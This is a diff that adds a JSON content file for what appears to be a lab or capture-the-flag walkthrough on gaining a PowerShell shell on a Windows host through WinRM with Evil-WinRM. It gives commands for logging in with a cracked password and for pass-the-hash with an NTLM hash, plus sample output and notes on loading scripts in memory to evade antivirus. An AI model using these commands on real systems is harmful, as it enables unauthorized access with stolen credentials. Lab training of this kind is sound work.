@@ -1,0 +1,75 @@
+[
+  {
+    "type": "section_heading",
+    "id": "winrm-intro",
+    "text": "Remote Access: Establishing a Shell via WinRM"
+  },
+  {
+    "type": "order_block",
+    "id": "winrm-theory",
+    "text": "WinRM (Windows Remote Management) is a Microsoft protocol that allows for remote management of systems over HTTP/HTTPS. Using <highlight>Evil-WinRM</highlight>, we can obtain an interactive PowerShell session if we have valid user credentials or their NTLM hashes."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "winrm-password-login",
+    "text": "Method 1: Authentication via Plaintext Password"
+  },
+  {
+    "type": "order_block",
+    "id": "winrm-pass-logic",
+    "text": "When we have recovered the cleartext password (e.g., through cracking a hash with John the Ripper), we can log in directly. This provides a full interactive PowerShell environment."
+  },
+  {
+    "type": "code_block",
+    "id": "evil-winrm-pass",
+    "language": "bash",
+    "code": "evil-winrm -i <TARGET_IP> -u 'enterprise-security' -p 'sand_0873959498'"
+  },
+  {
+    "type": "output_block",
+    "id": "winrm-pass-output",
+    "language": "text",
+    "code": "Info: Establishing connection to <TARGET_IP>...\n*Evil-WinRM* PS C:\\Users\\enterprise-security\\Documents> whoami\nvulnnet\\enterprise-security"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "winrm-pth-login",
+    "text": "Method 2: Authentication via Pass-the-Hash (PtH)"
+  },
+  {
+    "type": "order_block",
+    "id": "winrm-pth-logic",
+    "text": "In many cases, we might capture an NTLM hash (e.g., from Mimikatz or SecretsDump) but cannot crack it. WinRM allows us to use the <highlight>NTLM hash</highlight> itself for authentication without ever needing the original password."
+  },
+  {
+    "type": "code_block",
+    "id": "evil-winrm-hash",
+    "language": "bash",
+    "code": "evil-winrm -i <TARGET_IP> -u 'enterprise-security' -H '32196B35ED094F013B6188B740664504'"
+  },
+  {
+    "type": "order_block",
+    "id": "hash-format-tip",
+    "text": "Note: When using the <highlight>-H</highlight> flag, you only need the NT portion of the hash (the last part of a standard LM:NT string)."
+  },
+  {
+    "type": "output_block",
+    "id": "winrm-hash-output",
+    "language": "text",
+    "code": "Info: Establishing connection to <TARGET_IP>...\n*Evil-WinRM* PS C:\\Users\\enterprise-security\\Documents> hostname\nVULNNET-PROD"
+  },
+
+  {
+    "type": "explanation",
+    "id": "winrm-features",
+    "title": "Evil-WinRM Advanced Features",
+    "items": [
+      "File Transfer: Built-in 'upload' and 'download' commands for easy file movement",
+      "Memory Loading: Ability to load PowerShell scripts directly into memory (Bypassing some AVs)",
+      "Persistent Shell: Provides a more stable connection than basic Netcat reverse shells",
+      "Pass-the-Hash: Support for NTLM hash authentication for uncrackable passwords"
+    ]
+  }
+]
